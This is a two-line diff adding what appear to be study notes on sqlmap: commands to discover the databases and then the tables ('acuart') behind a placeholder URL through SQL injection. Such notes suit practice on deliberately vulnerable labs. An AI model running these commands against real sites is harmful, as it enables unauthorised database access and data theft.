@@ -1,0 +1,2 @@
+sqlmap -u http://xxx --dbs - DISCOVERING DATABASE
+sqlmap -u http://xxx -D acuart --tables - FINDING TABLES
